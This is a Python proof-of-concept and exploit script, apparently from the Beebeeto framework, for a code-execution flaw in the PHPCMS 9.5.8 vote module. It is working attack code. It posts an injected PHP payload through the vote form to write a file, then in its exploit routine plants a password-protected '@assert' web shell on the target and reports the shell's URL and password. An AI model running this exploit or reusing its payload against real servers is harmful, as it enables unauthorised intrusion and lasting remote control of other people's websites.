#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/ff0000team/Beebeeto-framework
"""

import re
import requests
import base64 as b64

from baseframe import BaseFrame
from utils.payload.webshell import PhpShell, PhpVerify


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0086',
            'name': 'PHPCMS V9.5.8 /phpcms/modules/vote/index.php 代码执行漏洞 POC & Exploit',
            'author': 'RickGray',
            'create_date': '2015-04-16',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'PHPCMS',
            'vul_version': ['<=9.5.8'],
            'type': 'Code Execution',
            'tag': ['phpcms漏洞', '/phpcms/modules/vote/index.php', 'php'],
            'desc': 'PHPCMS <= 9.5.8 投票处命令执行，可Getshell（需要 PHP <= 5.2）',
            'references': ['http://www.wooyun.org/bugs/wooyun-2015-0104157',
            ],
        },
    }

    @classmethod
    def get_vote_links(cls, args):
        vul_url = args['options']['target']
        vote_url = vul_url + '/index.php?m=vote'
        resp = requests.get(vote_url)
        ids = []
        for miter in re.finditer(r'<a href=.*?subjectid=(?P<id>\d+)', resp.content, re.DOTALL):
            ids.append(miter.group('id'))

        if len(ids) == 0:
            return None

        return {}.fromkeys(ids).keys()

    @classmethod
    def verify(cls, args):
        vul_url = args['options']['target']
        php = PhpVerify()
        ids = cls.get_vote_links(args)
        if ids:
            for i in ids:
                vul_path = '/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % str(i)
                exploit_url = vul_url + vul_path
                if args['options']['verbose']:
                    print '[*] Request URL: ' + exploit_url
                payload = {
                    'subjectid': i,
                    'radio[]': ');fputs(fopen(base64_decode(cmVhZG1lLnBocA),w),'
                               '"%s");\x80' % php.get_content()
                }

                requests.post(exploit_url, data=payload)
                v_path = '/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % str(i)
                requests.get(vul_url + v_path)
                shell_url = vul_url + '/readme.php'

                if php.check(shell_url):
                    args['success'] = True
                    args['poc_ret']['vul_url'] = args['options']['target']
                    return args
                else:
                    args['success'] = False
        else:
            args['success'] = False

        return args

    @classmethod
    def exploit(cls, args):
        vul_url = args['options']['target']
        php = PhpShell()
        php._content = '<?php var_dump(md5(123));@assert($_REQUEST[{0}]);'
        # You can set your own password with these two following ways:
        # pwd = 'your_pwd'
        # php.set_pwd(pwd)
        # for more instructions, check these files in utils/payload/webshell
        ids = cls.get_vote_links(args)
        if ids:
            for i in ids:
                vul_path = '/index.php?m=vote&c=index&a=post&subjectid=%s&siteid=1' % str(i)
                exploit_url = vul_url + vul_path
                if args['options']['verbose']:
                    print '[*] Request URL: ' + exploit_url
                payload = {
                    'subjectid': i,
                    'radio[]': ');fputs(fopen(base64_decode(cmVhZG1lLnBocA),w),'
                               'base64_decode(%s));\x80' % b64.b64encode(php.get_content()).replace('=', '')
                }

                requests.post(exploit_url, data=payload)
                v_path = '/index.php?m=vote&c=index&a=result&subjectid=%s&siteid=1' % str(i)
                requests.get(vul_url + v_path)
                shell_url = vul_url + '/readme.php'

                if php.check(shell_url):
                    args['success'] = True
                    args['poc_ret']['vul_url'] = vul_url
                    args['poc_ret']['Webshell'] = shell_url
                    args['poc_ret']['Webshell_PWD'] = php.get_pwd()
                    return args
                else:
                    args['success'] = False
        else:
            args['success'] = False

        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())